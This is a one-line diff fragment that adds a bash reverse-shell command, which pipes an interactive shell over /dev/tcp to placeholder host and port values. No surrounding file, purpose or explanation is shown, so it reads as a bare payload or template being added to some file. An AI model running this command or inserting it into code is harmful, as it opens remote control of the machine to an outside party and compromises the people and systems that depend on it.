@@ -1,0 +1,1 @@
+bash -i >& /dev/tcp/SHELLDROP_HOST/SHELLDROP_PORT 0>&1
